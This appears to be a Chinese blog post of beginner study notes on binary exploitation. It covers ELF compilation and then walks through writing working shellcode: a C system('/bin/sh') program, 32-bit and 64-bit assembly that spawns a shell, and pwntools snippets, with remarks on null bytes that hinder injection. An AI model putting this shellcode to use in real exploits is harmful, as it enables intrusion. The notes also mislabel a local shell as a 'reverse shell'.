title: PWN(二进制安全)学习笔记
author: jue
tags: []
categories: []
date: 2023-07-05 18:08:00
---
## C语言源->可执行文件

可执行文件分类
![upload successful](/images/pasted-644.png)

使用debian编译
![upload successful](/images/pasted-640.png)
但是，我们直接cat a.out会发现都是乱码

![upload successful](/images/pasted-641.png)
这里使用file命令去查看文件

![upload successful](/images/pasted-642.png)
ELF为linux可执行文件，也就是说gcc将C源码变成了可执行文件，但是在磁盘中才叫ELF，在

![upload successful](/images/pasted-645.png)

![upload successful](/images/pasted-646.png)

![upload successful](/images/pasted-643.png)

# shellcode
{% codeblock lang:C %}
//gcc -m32 -o shell shell.c
#include "stdlib.h"
#include "unistd.h"

void main(){
	system("/bin/sh");
	exit(0);

}
{% endcodeblock %}

![upload successful](/images/pasted-647.png)
执行该文件，反弹shell
![upload successful](/images/pasted-648.png)
使用gdb分析，找到system函数具体位置
## 32位shellcode编写
{% codeblock lang:asm %}
;;nasm -f elf32 i386.asm
;;ld -m elf_i386 -o i386 i386.o
;;objdump -d i386
global _start
_start:
	push "/sh"
	push "/bin"
	mov ebx, esp;;ebx="/bin/sh"
	xor edx, edx;;edx=0
	xor ecx, ecx;;ecx=0
	mov al,0xb;;设置al=0xb
	int 0x80
{% endcodeblock %}

![upload successful](/images/pasted-649.png)
可以getshell，使用gdb分析，命令为`b _start` ，然后 `r`，一直`n`下一步调试

使用`objdump -d i386`查看汇编指令

![upload successful](/images/pasted-650.png)
发现有一个00，后续可能不好注入

使用Python代码编写shellcode
{% codeblock lang:PY %}
from pwn import *
context(log_level = 'debug',arch = 'i386',os = 'linux')
shellcode=asm(shellcraft.sh())
{% endcodeblock %}

![upload successful](/images/pasted-659.png)
## 64位shellcode编写
{% codeblock lang:asm %}
;;nasm -f elf64 x64.asm
;;ld -m elf_x86_64 -o x64 x64.o
;;objdump -d x64
global _start
_start:
	mov rbx, '/bin/sh'
	push rbx
	push rsp
	pop rdi
	xor esi, esi
	xor edx, edx
	push 0x3b
	pop rax
	syscall
{% endcodeblock %}

![upload successful](/images/pasted-651.png)
同样能反弹shell，使用gdb一步步分析，这里给出第一部和最后一步的截屏

![upload successful](/images/pasted-652.png)

![upload successful](/images/pasted-658.png)
使用Python代码编写shellcode
{% codeblock lang:PY %}
from pwn import *
context(log_level = 'debug',arch = 'amd64',os = 'linux')
shellcode=asm(shellcraft.sh())
{% endcodeblock %}